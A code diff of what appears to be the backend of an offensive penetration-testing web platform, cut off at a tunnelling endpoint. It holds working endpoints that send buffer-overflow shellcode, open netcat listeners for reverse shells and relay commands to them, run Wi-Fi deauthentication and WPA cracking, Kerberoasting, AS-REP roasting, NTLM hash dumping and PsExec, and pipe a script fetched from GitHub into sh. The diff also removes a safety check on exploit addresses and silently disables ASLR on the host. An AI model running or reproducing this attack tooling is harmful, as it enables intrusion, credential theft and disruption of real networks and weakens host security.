+    return {"payload":req.payload_type,"lhost":req.lhost,"lport":req.lport,
+            "bad_chars":bad_bytes,"size":size,"shellcode_python":shellcode_py,
+            "shellcode_bytes":raw_bytes,"message":f"✅ Shellcode {size} bytes → {req.lhost}:{req.lport}"}
 
 
 @app.post("/api/bof/exploit")
@@ -936,76 +1404,97 @@ async def bof_exploit(req: BOFRequest, user=Depends(verify_token)):
     if not req.offset: return {"error":"Offset required"}
     if not req.jmp_esp: return {"error":"JMP ESP address required"}
     if not req.shellcode: return {"error":"Shellcode required"}
-    if req.jmp_esp.strip().lower().startswith("0xf7"):
-        return {"error":"Refusing libc-style JMP ESP address. Clear saved value and use a confirmed stable JMP ESP from the target binary/module."}
+
+    # Ensure ASLR is off — libc gadgets are only stable with ASLR=0
+    try:
+        with open("/proc/sys/kernel/randomize_va_space", "w") as _f:
+            _f.write("0\n")
+    except Exception:
+        pass
+
     host, port = _bof_parse_target(req.target)
     binary = (req.binary_path or "").strip()
     prefix = req.prefix.encode("latin-1") if req.prefix else b""
     if os.path.exists(binary):
         await _bof_restart_server(binary, port)
-    addr_int = int(req.jmp_esp.strip(),16)
-    retn = _struct.pack("<I",addr_int)
+    try:
+        addr_int = int(req.jmp_esp.strip().lower().replace("0x",""), 16)
+    except ValueError:
+        return {"error": f"Invalid JMP ESP address: {req.jmp_esp}"}
+    retn = _struct.pack("<I", addr_int)
+    # Parse shellcode — handles both \xNN text format and raw bytes
     hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', req.shellcode)
-    sc = bytes([int(h,16) for h in hex_bytes])
-    if not sc: return {"error":"Could not parse shellcode"}
-    payload = prefix + b"A"*req.offset + retn + b"\x90"*16 + sc
+    if not hex_bytes:
+        hex_bytes = re.findall(r'(?<![0-9a-fA-F])([0-9a-fA-F]{2})(?![0-9a-fA-F])', req.shellcode)
+    sc = bytes([int(h, 16) for h in hex_bytes])
+    if not sc: return {"error": "Could not parse shellcode — re-run Phase 6"}
+    nop_sled = b"\x90" * 32
+    payload = prefix + b"A" * req.offset + retn + nop_sled + sc
     _bof_send(host, port, payload, timeout=6)
-    return {"sent":True,"payload_size":len(payload),"offset":req.offset,"retn":req.jmp_esp,"shellcode_size":len(sc),"message":f"✅ Exploit sent!"}
+    return {"sent": True, "payload_size": len(payload), "offset": req.offset,
+            "retn": req.jmp_esp, "shellcode_size": len(sc),
+            "message": f"✅ Exploit sent — {len(payload)} bytes (offset={req.offset}, nop_sled=32, sc={len(sc)})"}
 
 
-# ── INTEGRATED SHELL LISTENER ────────────────────────────────
+# ── INTEGRATED SHELL LISTENER (nc-backed) ────────────────────
 class _ShellSession:
     def __init__(self, lid, lport):
         self.lid    = lid
         self.lport  = lport
         self.output = []
         self.status = "waiting"   # waiting | connected | closed
-        self.writer = None
-        self.server = None
+        self.proc   = None        # asyncio subprocess (nc)
 
 SHELL_SESSIONS: dict = {}
-
-async def _shell_handler(reader, writer, lid):
-    addr = writer.get_extra_info("peername")
-    s = SHELL_SESSIONS.get(lid)
-    if not s: return
-    s.status = "connected"
-    s.writer = writer
-    s.output.append(f"[+] Shell connected from {addr[0]}:{addr[1]}\n")
-    try:
-        while True:
-            data = await asyncio.wait_for(reader.read(4096), timeout=300)
-            if not data: break
-            s.output.append(data.decode("utf-8", errors="replace"))
-    except Exception:
-        pass
-    s.status = "closed"
-    try: writer.close()
-    except: pass
 
 @app.post("/api/bof/shell/start")
 async def bof_shell_start(req: BOFRequest, user=Depends(verify_token)):
     lport = req.lport or 4444
     lid   = f"shell_{lport}"
-    # Close existing session on same port
-    if lid in SHELL_SESSIONS:
-        try:
-            if SHELL_SESSIONS[lid].server: SHELL_SESSIONS[lid].server.close()
-            if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
+    # Kill old session
+    old = SHELL_SESSIONS.pop(lid, None)
+    if old and old.proc:
+        try: old.proc.kill()
         except: pass
-    # Kill any existing process holding the port (e.g. leftover nc)
+    # Free the port
     subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
-    await asyncio.sleep(0.5)
+    subprocess.run(["pkill", "-f", f"nc.*{lport}"], capture_output=True)
+    await asyncio.sleep(0.6)
+
     session = _ShellSession(lid, lport)
     SHELL_SESSIONS[lid] = session
+
     try:
-        server = await asyncio.start_server(
-            lambda r, w: _shell_handler(r, w, lid), "0.0.0.0", lport,
-            reuse_port=True)
-        session.server = server
-        asyncio.create_task(server.serve_forever())
+        proc = await asyncio.create_subprocess_exec(
+            "nc", "-lvnp", str(lport),
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+        )
+        session.proc = proc
+
+        async def _read_nc():
+            session.output.append(f"[*] nc listener on 0.0.0.0:{lport}\n")
+            while True:
+                try:
+                    chunk = await asyncio.wait_for(proc.stdout.read(4096), timeout=300)
+                    if not chunk:
+                        break
+                    decoded = chunk.decode("utf-8", errors="replace")
+                    session.output.append(decoded)
+                    # Detect first data → shell connected
+                    if session.status == "waiting" and decoded.strip():
+                        session.status = "connected"
+                        session.output.append("[+] Shell connected!\n")
+                except asyncio.TimeoutError:
+                    break
+                except Exception:
+                    break
+            session.status = "closed"
+
+        asyncio.create_task(_read_nc())
         return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
-                "message": f"Listener ready on port {lport} — send exploit now"}
+                "message": f"nc listener ready on port {lport}"}
     except Exception as e:
         return {"error": str(e), "lid": lid, "ok": False}
 
@@ -1019,11 +1508,12 @@ async def bof_shell_output(lid: str, user=Depends(verify_token)):
 @app.post("/api/bof/shell/{lid}/cmd")
 async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
     s = SHELL_SESSIONS.get(lid)
-    if not s or not s.writer: return {"error": "No shell connected"}
+    if not s or not s.proc or not s.proc.stdin:
+        return {"error": "No shell connected"}
     try:
         cmd = body.get("cmd", "")
-        s.writer.write((cmd + "\n").encode())
-        await s.writer.drain()
+        s.proc.stdin.write((cmd + "\n").encode())
+        await s.proc.stdin.drain()
         return {"sent": True}
     except Exception as e:
         return {"error": str(e)}
@@ -1031,10 +1521,8 @@ async def bof_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
 @app.post("/api/bof/shell/{lid}/stop")
 async def bof_shell_stop(lid: str, user=Depends(verify_token)):
     s = SHELL_SESSIONS.pop(lid, None)
-    if s:
-        try:
-            if s.server: s.server.close()
-            if s.writer: s.writer.close()
+    if s and s.proc:
+        try: s.proc.kill()
         except: pass
     return {"stopped": True}
 
@@ -1178,22 +1666,45 @@ async def exploit_payload(req: ExploitRequest, user=Depends(verify_token)):
 async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
     lport = req.lport or 4444
     lid   = f"exploit_shell_{lport}"
-    if lid in SHELL_SESSIONS:
-        try:
-            if SHELL_SESSIONS[lid].server: SHELL_SESSIONS[lid].server.close()
-            if SHELL_SESSIONS[lid].writer: SHELL_SESSIONS[lid].writer.close()
+    old = SHELL_SESSIONS.pop(lid, None)
+    if old and old.proc:
+        try: old.proc.kill()
         except: pass
     subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
-    await asyncio.sleep(0.5)
+    subprocess.run(["pkill", "-f", f"nc.*{lport}"], capture_output=True)
+    await asyncio.sleep(0.6)
     session = _ShellSession(lid, lport)
     SHELL_SESSIONS[lid] = session
     try:
-        server = await asyncio.start_server(
-            lambda r, w: _shell_handler(r, w, lid), "0.0.0.0", lport,
-            reuse_port=True)
-        session.server = server
-        asyncio.create_task(server.serve_forever())
-        return {"lid": lid, "port": lport, "status": "waiting", "ok": True, "message": f"Listener ready on port {lport}"}
+        proc = await asyncio.create_subprocess_exec(
+            "nc", "-lvnp", str(lport),
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+        )
+        session.proc = proc
+
+        async def _read_exploit_nc():
+            session.output.append(f"[*] nc listener on 0.0.0.0:{lport}\n")
+            while True:
+                try:
+                    chunk = await asyncio.wait_for(proc.stdout.read(4096), timeout=300)
+                    if not chunk:
+                        break
+                    decoded = chunk.decode("utf-8", errors="replace")
+                    session.output.append(decoded)
+                    if session.status == "waiting" and decoded.strip():
+                        session.status = "connected"
+                        session.output.append("[+] Shell connected!\n")
+                except asyncio.TimeoutError:
+                    break
+                except Exception:
+                    break
+            session.status = "closed"
+
+        asyncio.create_task(_read_exploit_nc())
+        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
+                "message": f"nc listener ready on port {lport}"}
     except Exception as e:
         return {"error": str(e), "lid": lid, "ok": False}
 
@@ -1207,11 +1718,12 @@ async def exploit_shell_output(lid: str, user=Depends(verify_token)):
 @app.post("/api/exploit/shell/{lid}/cmd")
 async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
     s = SHELL_SESSIONS.get(lid)
-    if not s or not s.writer: return {"error": "No shell connected"}
+    if not s or not s.proc or not s.proc.stdin:
+        return {"error": "No shell connected"}
     try:
         cmd = body.get("cmd", "")
-        s.writer.write((cmd + "\n").encode())
-        await s.writer.drain()
+        s.proc.stdin.write((cmd + "\n").encode())
+        await s.proc.stdin.drain()
         return {"sent": True}
     except Exception as e:
         return {"error": str(e)}
@@ -1219,10 +1731,8 @@ async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
 @app.post("/api/exploit/shell/{lid}/stop")
 async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
     s = SHELL_SESSIONS.pop(lid, None)
-    if s:
-        try:
-            if s.server: s.server.close()
-            if s.writer: s.writer.close()
+    if s and s.proc:
+        try: s.proc.kill()
         except: pass
     return {"stopped": True}
 
@@ -3385,3 +3895,2253 @@ async def recon_shodan(req: ShodanRequest, user=Depends(verify_token)):
     save_scan(scan_id, "shodan", req.target, {"output": raw_output})
     return {"scan_id": scan_id, "target": req.target, "host": host,
             "raw_output": raw_output, "timestamp": datetime.datetime.utcnow().isoformat(), **result_data}
+
+
+# ══════════════════════════════════════════════════════════════
+#  REMAINING MODULES — BACKEND ENDPOINTS
+# ══════════════════════════════════════════════════════════════
+
+import uuid as _uuid
+
+# ─────────────────────────────────────────────────────────────
+# WIRELESS ATTACKS
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/wireless/interfaces")
+async def wireless_interfaces(token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(["iwconfig"], timeout=10)
+    if result.get("error","") and "not found" in result.get("error",""):
+        result = await run_tool(["ip", "link", "show"], timeout=10)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if "wlan" in line.lower() or "wlp" in line.lower() or "mon" in line.lower():
+            findings.append({"severity": "INFO", "title": "Wireless Interface", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No wireless interfaces found", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": "localhost", "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} interface(s) detected"}
+
+
+@app.post("/api/wireless/scan")
+async def wireless_scan(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    iface = (req.options or {}).get("iface", req.target)
+    out_file = f"/tmp/airodump_{scan_id}"
+    result = await run_tool(
+        ["airodump-ng", iface, "--write-interval", "1", "--output-format", "csv", "-w", out_file],
+        timeout=15
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        parts = line.split(",")
+        if len(parts) >= 9 and len(parts[0].strip()) == 17:
+            bssid = parts[0].strip()
+            signal = parts[8].strip() if len(parts) > 8 else "N/A"
+            enc = parts[5].strip() if len(parts) > 5 else "N/A"
+            ssid = parts[13].strip() if len(parts) > 13 else "Unknown"
+            channel = parts[3].strip() if len(parts) > 3 else "?"
+            sev = "HIGH" if "WEP" in enc else ("MEDIUM" if "WPA" in enc else "INFO")
+            findings.append({"severity": sev, "title": f"Network: {ssid}",
+                             "detail": f"BSSID={bssid} CH={channel} ENC={enc} Signal={signal}"})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Scan completed", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": iface, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} network(s) found"}
+
+
+@app.post("/api/wireless/deauth")
+async def wireless_deauth(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    bssid = opts.get("bssid", "00:11:22:33:44:55")
+    iface = opts.get("iface", req.target)
+    result = await run_tool(["aireplay-ng", "--deauth", "5", "-a", bssid, iface], timeout=20)
+    raw = result["output"] + result.get("error","")
+    sent = sum(1 for l in raw.splitlines() if "sent" in l.lower() or "deauth" in l.lower())
+    sev = "HIGH" if sent > 0 else "MEDIUM"
+    findings = [{"severity": sev, "title": "Deauthentication Attack",
+                 "detail": f"Sent deauth frames to BSSID {bssid} on {iface}. Lines matched: {sent}"}]
+    return {"scan_id": scan_id, "target": bssid, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Deauth frames sent"}
+
+
+@app.post("/api/wireless/wifite")
+async def wireless_wifite(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    iface = (req.options or {}).get("iface", req.target)
+    result = await run_tool(["wifite", "--interface", iface, "--kill", "--no-wps", "-v"], timeout=60)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if "cracked" in line.lower():
+            findings.append({"severity": "CRITICAL", "title": "Handshake Cracked", "detail": line.strip()})
+        elif "handshake" in line.lower():
+            findings.append({"severity": "HIGH", "title": "Handshake Captured", "detail": line.strip()})
+        elif "target" in line.lower():
+            findings.append({"severity": "MEDIUM", "title": "Target Identified", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Wifite run complete", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": iface, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} event(s) detected"}
+
+
+@app.post("/api/wireless/crack")
+async def wireless_crack(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    capfile = opts.get("capfile", req.target)
+    wordlist = opts.get("wordlist", "/usr/share/wordlists/rockyou.txt")
+    result = await run_tool(["aircrack-ng", capfile, "-w", wordlist], timeout=120)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if "key found" in line.lower():
+            findings.append({"severity": "CRITICAL", "title": "WPA Key Found", "detail": line.strip()})
+        elif "failed" in line.lower():
+            findings.append({"severity": "INFO", "title": "Crack Failed", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Aircrack-ng result", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": capfile, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Crack attempt complete"}
+
+
+# ─────────────────────────────────────────────────────────────
+# ACTIVE DIRECTORY
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/ad/enum")
+async def ad_enum(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    dc_ip = opts.get("dc_ip", req.target)
+    domain = opts.get("domain", "domain.com")
+    base_dn = "DC=" + domain.replace(".", ",DC=")
+    r1 = await run_tool(["enum4linux-ng", "-A", req.target], timeout=60)
+    r2 = await run_tool(["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base_dn], timeout=30)
+    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "user" in ll and "account" in ll:
+            findings.append({"severity": "MEDIUM", "title": "User Account Found", "detail": line.strip()})
+        elif "share" in ll:
+            findings.append({"severity": "HIGH", "title": "Share Discovered", "detail": line.strip()})
+        elif "password policy" in ll:
+            findings.append({"severity": "HIGH", "title": "Password Policy", "detail": line.strip()})
+        elif "group" in ll and len(findings) < 30:
+            findings.append({"severity": "INFO", "title": "Group Entry", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "AD Enum complete", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} AD finding(s)"}
+
+
+@app.post("/api/ad/kerberoast")
+async def ad_kerberoast(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    domain = opts.get("domain", ""); username = opts.get("username", ""); password = opts.get("password", "")
+    dc_ip = opts.get("dc_ip", req.target)
+    if not domain or not username:
+        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Domain and Username first",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    result = await run_tool(
+        ["impacket-GetUserSPNs", f"{domain}/{username}:{password}@{dc_ip}", "-request", "-outputfile", "/tmp/spns.txt"],
+        timeout=60)
+    raw = result["output"] + result.get("error","")
+    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
+    if conn_err:
+        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
+                "message":f"❌ Cannot reach DC at {dc_ip} — check target IP and that port 88/445 is open",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    findings = []
+    for line in raw.splitlines():
+        if "$krb5tgs$" in line:
+            findings.append({"severity":"CRITICAL","title":"Kerberoastable Hash","detail":line[:120]})
+        elif "serviceprincipalname" in line.lower() and "@" in line:
+            findings.append({"severity":"HIGH","title":"SPN Found","detail":line.strip()[:100]})
+    msg = f"✅ {len(findings)} kerberoastable SPN(s) found" if findings else "No kerberoastable SPNs — all accounts require pre-auth or no SPNs set"
+    return {"scan_id":scan_id,"target":dc_ip,"findings":findings,"raw_output":raw,
+            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}
+
+
+@app.post("/api/ad/asreproast")
+async def ad_asreproast(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    domain = opts.get("domain",""); username = opts.get("username","")
+    dc_ip = opts.get("dc_ip", req.target)
+    if not domain:
+        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Domain first",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    users_file = f"/tmp/asrep_{uuid.uuid4().hex[:6]}.txt"
+    with open(users_file,"w") as f: f.write((username or "Administrator")+"\n")
+    result = await run_tool(
+        ["impacket-GetNPUsers", f"{domain}/","-usersfile",users_file,"-no-pass","-dc-ip",dc_ip], timeout=60)
+    raw = result["output"] + result.get("error","")
+    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
+    if conn_err:
+        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
+                "message":f"❌ Cannot reach DC at {dc_ip} — not a Windows AD server",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    findings = []
+    for line in raw.splitlines():
+        if "$krb5asrep$" in line:
+            findings.append({"severity":"CRITICAL","title":"AS-REP Hash Captured","detail":line[:120]})
+    msg = f"✅ {len(findings)} AS-REP hash(es) captured" if findings else "No AS-REP hashes — all accounts require pre-authentication"
+    return {"scan_id":scan_id,"target":dc_ip,"findings":findings,"raw_output":raw,
+            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}
+
+
+@app.post("/api/ad/bloodhound")
+async def ad_bloodhound(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    username = opts.get("username", "user")
+    password = opts.get("password", "password")
+    domain = opts.get("domain", "domain.com")
+    dc_ip = opts.get("dc_ip", req.target)
+    os.makedirs("/tmp/bh_out", exist_ok=True)
+    result = await run_tool(
+        ["bloodhound-python", "-u", username, "-p", password, "-d", domain,
+         "-dc", dc_ip, "-c", "All", "--zip", "-o", "/tmp/bh_out/"],
+        timeout=120
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "done" in ll and "collecting" in ll:
+            findings.append({"severity": "HIGH", "title": "Collection Complete", "detail": line.strip()})
+        elif "error" in ll:
+            findings.append({"severity": "MEDIUM", "title": "Collection Error", "detail": line.strip()})
+        elif "zip" in ll:
+            findings.append({"severity": "INFO", "title": "Output Archive", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "BloodHound result", "detail": raw[:500]})
+    return {"scan_id": scan_id, "target": domain, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "BloodHound collection finished"}
+
+
+@app.post("/api/ad/secretsdump")
+async def ad_secretsdump(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    domain = opts.get("domain", "domain.com")
+    username = opts.get("username", "user")
+    password = opts.get("password", "password")
+    result = await run_tool(
+        ["impacket-secretsdump", f"{domain}/{username}:{password}@{req.target}"],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
+    if conn_err:
+        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
+                "message":f"❌ Cannot reach {req.target} — not a Windows AD server or SMB not accessible",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    findings = []
+    for line in raw.splitlines():
+        if ":::" in line and len(line.split(":")) >= 4:
+            user = line.split(":")[0]
+            sev = "CRITICAL" if user.lower() in ("administrator","root","admin") else "HIGH"
+            findings.append({"severity":sev,"title":"NTLM Hash Dumped","detail":line.strip()[:120]})
+    msg = f"✅ {len(findings)} NTLM hash(es) dumped" if findings else "❌ No hashes — check credentials or target is not a DC"
+    return {"scan_id":scan_id,"target":req.target,"findings":findings,"raw_output":raw,
+            "timestamp":datetime.datetime.utcnow().isoformat(),"message":msg}
+
+
+@app.post("/api/ad/psexec")
+async def ad_psexec(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    domain = opts.get("domain",""); username = opts.get("username",""); password = opts.get("password","")
+    if not username:
+        return {"scan_id":scan_id,"findings":[],"raw_output":"","message":"❌ Enter Username first",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    result = await run_tool(
+        ["impacket-psexec", f"{domain}/{username}:{password}@{req.target}", "whoami"], timeout=30)
+    raw = result["output"] + result.get("error","")
+    conn_err = any(e in raw for e in ["Connection refused","No route to host","timed out","Name or service"])
+    if conn_err:
+        return {"scan_id":scan_id,"findings":[],"raw_output":raw,
+                "message":f"❌ Cannot reach {req.target} on SMB — target is not a Windows machine",
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    shell_obtained = any(k in raw.lower() for k in ["nt authority\\system","administrator","smb"])
+    findings = [{"severity":"CRITICAL" if shell_obtained else "MEDIUM",
+                 "title":"Shell obtained via PsExec" if shell_obtained else "PsExec failed",
+                 "detail":raw.strip()[:200]}] if raw.strip() else []
+    return {"scan_id":scan_id,"target":req.target,"findings":findings,"raw_output":raw,
+            "timestamp":datetime.datetime.utcnow().isoformat(),
+            "message":"✅ Shell obtained!" if shell_obtained else "❌ Shell not obtained — check credentials"}
+
+
+# ─────────────────────────────────────────────────────────────
+# PRIVILEGE ESCALATION
+# ─────────────────────────────────────────────────────────────
+
+_GTFO_SUID = {"python", "python3", "perl", "ruby", "bash", "vim", "find", "nmap",
+              "awk", "less", "more", "man", "wget", "nc", "netcat", "php", "lua",
+              "tclsh", "node", "env", "dash", "sh"}
+
+@app.post("/api/privesc/linpeas")
+async def privesc_linpeas(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    if os.path.exists("/tmp/linpeas.sh"):
+        result = await run_tool(["sh", "/tmp/linpeas.sh"], timeout=120)
+    else:
+        result = await run_tool(
+            ["sh", "-c", "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"],
+            timeout=120
+        )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        stripped = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
+        if not stripped:
+            continue
+        if "\x1b[1;31m" in line or "CRITICAL" in line:
+            findings.append({"severity": "CRITICAL", "title": "LinPEAS Critical", "detail": stripped})
+        elif "\x1b[1;33m" in line or "[+]" in line:
+            findings.append({"severity": "HIGH", "title": "LinPEAS High", "detail": stripped})
+        elif "\x1b[1;32m" in line:
+            findings.append({"severity": "INFO", "title": "LinPEAS Info", "detail": stripped})
+        if len(findings) >= 50:
+            break
+    if not findings:
+        findings.append({"severity": "INFO", "title": "LinPEAS output", "detail": raw[:600]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw[:3000],
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} findings from linpeas"}
+
+
+@app.post("/api/privesc/linux_suggest")
+async def privesc_linux_suggest(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    script = "/tmp/linux-exploit-suggester.py" if os.path.exists("/tmp/linux-exploit-suggester.py") else "les.py"
+    result = await run_tool(["python3", script], timeout=60)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if re.search(r'CVE-\d{4}-\d+', line, re.I):
+            cve = re.search(r'CVE-\d{4}-\d+', line, re.I).group()
+            findings.append({"severity": "HIGH", "title": f"Kernel Exploit Suggestion: {cve}", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No suggestions or tool missing", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} CVE(s) suggested"}
+
+
+@app.post("/api/privesc/suid")
+async def privesc_suid(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(["find", "/", "-perm", "-4000", "-type", "f"], timeout=30)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        binary = os.path.basename(line).lower()
+        if binary in _GTFO_SUID:
+            findings.append({"severity": "CRITICAL", "title": f"SUID GTFOBin: {binary}", "detail": line})
+        else:
+            findings.append({"severity": "MEDIUM", "title": f"SUID Binary: {binary}", "detail": line})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No SUID binaries found", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} SUID file(s) found"}
+
+
+@app.post("/api/privesc/sudo")
+async def privesc_sudo(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(["sudo", "-l"], timeout=15)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower().strip()
+        if "may run" in ll or "nopasswd" in ll or "(all)" in ll:
+            exploitable = any(b in ll for b in _GTFO_SUID)
+            sev = "CRITICAL" if exploitable else "HIGH"
+            findings.append({"severity": sev, "title": "Sudo Permission", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Sudo output", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} sudo rule(s)"}
+
+
+@app.post("/api/privesc/capabilities")
+async def privesc_capabilities(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(["getcap", "-r", "/"], timeout=30)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "cap_setuid" in ll or "cap_sys_admin" in ll:
+            findings.append({"severity": "CRITICAL", "title": "Dangerous Capability", "detail": line.strip()})
+        elif "cap_" in ll:
+            findings.append({"severity": "MEDIUM", "title": "Capability Found", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No dangerous capabilities", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} capability entry(ies)"}
+
+
+@app.post("/api/privesc/cron")
+async def privesc_cron(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["sh", "-c", "cat /etc/crontab; ls -la /etc/cron.*; find /var/spool/cron -readable 2>/dev/null"],
+        timeout=15
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.strip()
+        if not ll or ll.startswith("#"):
+            continue
+        if re.search(r'\*.*\*.*\*', ll):
+            findings.append({"severity": "MEDIUM", "title": "Cron Job Entry", "detail": ll})
+        if "rwx" in ll or "rw-rw-rw" in ll:
+            findings.append({"severity": "HIGH", "title": "World-Writable Cron Script", "detail": ll})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Cron output", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} cron entry(ies)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# PIVOTING & TUNNELING
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/tunnel/chisel")
